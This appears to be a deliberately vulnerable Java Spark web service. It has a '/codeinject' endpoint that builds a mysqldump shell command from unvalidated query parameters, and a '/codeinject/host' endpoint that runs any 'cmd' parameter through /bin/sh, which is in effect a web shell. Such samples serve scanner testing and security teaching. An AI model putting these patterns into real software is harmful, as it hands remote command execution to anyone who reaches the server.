import static spark.Spark.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;

public class DataProcessor {
    public static void main(String[] args) {
        port(8080);
        
        get("/codeinject", (req, res) -> {
            String host = req.queryParams("host");
            String db = req.queryParams("db");
            String user = req.queryParams("user");
            String password = req.queryParams("password");
            
            if (host == null || db == null || user == null || password == null) {
                return "Missing parameters";
            }
            
            String command = String.format("mysqldump -h %s -u %s -p%s --set-charset=utf8 %s", 
                host, user, password, db);
            
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
            Process process = pb.start();
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\
");
            }
            while ((line = errorReader.readLine()) != null) {
                output.append("ERROR: ").append(line).append("\
");
            }
            
            return output.toString();
        });
        
        get("/codeinject/host", (req, res) -> {
            String cmd = req.queryParams("cmd");
            if (cmd == null) return "Missing command";
            
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);
            Process process = pb.start();
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\
");
            }
            
            return output.toString();
        });
    }
}